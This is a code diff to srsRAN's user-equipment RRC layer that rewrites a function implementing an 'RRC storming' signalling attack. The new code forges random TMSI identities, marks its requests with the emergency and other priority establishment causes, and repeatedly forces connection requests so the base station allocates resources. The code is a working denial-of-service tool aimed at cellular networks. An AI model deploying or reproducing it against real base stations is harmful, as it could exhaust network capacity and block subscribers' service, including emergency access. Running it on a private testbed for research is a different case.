@@ -3038,74 +3038,112 @@ void rrc::nr_scg_failure_information(const scg_failure_cause_t cause)
 
 void rrc::start_rrc_storming_attack()
 {
-  logger.info("[RRC_STORM] Starting RRC Storming Attack...");
+  logger.info("[RRC_ATTACK] starting rrc storm...");
   
-  // Attack parameters from config
-  const int max_attacks = args.rrc_storming_max_attacks;  // Maximum number of attacks
-  const int attack_interval_ms = args.rrc_storming_interval_ms;  // Interval between attacks (ms)
+  const int max_attacks = args.rrc_storming_max_attacks;
+  const int attack_interval_ms = args.rrc_storming_interval_ms;
   
-  logger.info("[RRC_STORM] Attack Config: max_attacks=%d, interval_ms=%d", max_attacks, attack_interval_ms);
+  logger.info("[RRC_ATTACK] running %d cycles with %dms delay", max_attacks, attack_interval_ms);
   
   std::random_device rd;
   std::mt19937 gen(rd());
-  std::uniform_int_distribution<uint32_t> tmsi_dist(0x00000000, 0xFFFFFFFF);
-  std::uniform_int_distribution<uint8_t> mmec_dist(0x00, 0xFF);
-  std::uniform_int_distribution<uint8_t> cause_dist(0, 7);  // Different establishment causes
+  std::uniform_int_distribution<uint32_t> tmsi_dist(0x00000001, 0xFFFFFFFE);
+  std::uniform_int_distribution<uint8_t> mmec_dist(0x01, 0xFE);
   
-  int attack_count = 0;
+  // try different establishment causes 
+  std::vector<srsran::establishment_cause_t> priority_causes = {
+    srsran::establishment_cause_t::emergency,
+    srsran::establishment_cause_t::mt_access,
+    srsran::establishment_cause_t::mo_sig
+  };
+  std::uniform_int_distribution<size_t> cause_dist(0, priority_causes.size() - 1);
   
-  while (attack_count < max_attacks && running) {
+  int cycle_count = 0;
+  bool attack_active = true;
+  
+  while (cycle_count < max_attacks && running && attack_active) {
     try {
-      // Generate random UE identity
+      cycle_count++;
+      
+      logger.info("[RRC_ATTACK] --- cycle %d ---", cycle_count);
+      
+      // disconnect if we're still connected from last time
+      if (state == RRC_STATE_CONNECTED) {
+        logger.info("[RRC_ATTACK] disconnecting previous connection");
+        leave_connected();
+        std::this_thread::sleep_for(std::chrono::milliseconds(50));
+      }
+      
+      // make sure we're idle
+      if (state != RRC_STATE_IDLE) {
+        logger.warning("[RRC_ATTACK] state isn't idle, forcing it");
+        state = RRC_STATE_IDLE;
+        std::this_thread::sleep_for(std::chrono::milliseconds(50));
+      }
+      
+      // generate fake identity
       srsran::s_tmsi_t random_tmsi;
       random_tmsi.m_tmsi = tmsi_dist(gen);
       random_tmsi.mmec = mmec_dist(gen);
       
-      // Generate random establishment cause
-      srsran::establishment_cause_t cause = static_cast<srsran::establishment_cause_t>(cause_dist(gen));
-      
-      logger.info("[RRC_STORM] Attack #%d: TMSI=0x%08x, MMEC=0x%02x, Cause=%d", 
-                 attack_count + 1, random_tmsi.m_tmsi, random_tmsi.mmec, (int)cause);
-      
-      // Set the random UE identity
+      logger.info("[RRC_ATTACK] using fake id: tmsi=0x%08x mmec=0x%02x", 
+                 random_tmsi.m_tmsi, random_tmsi.mmec);
       set_ue_identity(random_tmsi);
       
-      // Create a dummy NAS message for the connection request
+      // pick a connection cause
+      srsran::establishment_cause_t cause = priority_causes[cause_dist(gen)];
+      const char* cause_str = (cause == srsran::establishment_cause_t::emergency) ? "emergency" :
+                             (cause == srsran::establishment_cause_t::mt_access) ? "mt_access" : "mo_signaling";
+      
+      logger.info("[RRC_ATTACK] requesting connection, cause=%s", cause_str);
+      
+      // build nas message
       srsran::unique_byte_buffer_t nas_msg = srsran::make_byte_buffer();
       if (nas_msg) {
-        // Create a minimal NAS message (Service Request)
-        nas_msg->msg[0] = 0x2D;  // Service Request message type
-        nas_msg->msg[1] = 0x00;  // Service type: mobile originating calls
-        nas_msg->N_bytes = 2;
+        nas_msg->msg[0] = 0x07;  
+        nas_msg->msg[1] = 0x4D;  
+        nas_msg->msg[2] = 0x01;  
+        nas_msg->msg[3] = (random_tmsi.m_tmsi >> 24) & 0xFF;
+        nas_msg->msg[4] = (random_tmsi.m_tmsi >> 16) & 0xFF;
+        nas_msg->msg[5] = (random_tmsi.m_tmsi >> 8) & 0xFF;
+        nas_msg->msg[6] = random_tmsi.m_tmsi & 0xFF;
+        nas_msg->N_bytes = 7;
         
-        // Send connection request
         if (connection_request(cause, std::move(nas_msg))) {
-          logger.info("[RRC_STORM] Connection Request sent successfully");
+          logger.info("[RRC_ATTACK] connection req sent");
         } else {
-          logger.warning("[RRC_STORM] Failed to send Connection Request");
+          logger.warning("[RRC_ATTACK] connection req failed");
         }
       }
       
-      attack_count++;
-      
-      // Wait before next attack
-      std::this_thread::sleep_for(std::chrono::milliseconds(attack_interval_ms));
-      
-      // Simulate going back to idle state by triggering RLF
-      if (attack_count % 10 == 0) {
-        logger.info("[RRC_STORM] Simulating RLF to return to idle state");
-        simulate_rlf.store(true, std::memory_order_relaxed);
-        std::this_thread::sleep_for(std::chrono::milliseconds(50));
-        simulate_rlf.store(false, std::memory_order_relaxed);
+      // wait for connection
+      logger.info("[RRC_ATTACK] waiting for response...");
+      int wait_count = 0;
+      int max_wait = 20;
+      while (state != RRC_STATE_CONNECTED && wait_count < max_wait && running) {
+        std::this_thread::sleep_for(std::chrono::milliseconds(100));
+        wait_count++;
       }
       
+      if (state == RRC_STATE_CONNECTED) {
+        logger.info("[RRC_ATTACK] connected, gnb allocated resources");
+        std::this_thread::sleep_for(std::chrono::milliseconds(200));
+      } else {
+        logger.warning("[RRC_ATTACK] timeout waiting for connection, maybe gnb is overloaded");
+      }
+      
+      // delay before next cycle
+      logger.info("[RRC_ATTACK] sleeping %dms", attack_interval_ms);
+      std::this_thread::sleep_for(std::chrono::milliseconds(attack_interval_ms));
+      
     } catch (const std::exception& e) {
-      logger.error("[RRC_STORM] Exception in attack: %s", e.what());
+      logger.error("[RRC_ATTACK] exception: %s", e.what());
+      attack_active = false;
       break;
     }
   }
   
-  logger.info("[RRC_STORM] Attack completed. Total attacks: %d", attack_count);
+  logger.info("[RRC_ATTACK] done, ran %d cycles total", cycle_count);
 }
 
 } // namespace srsue
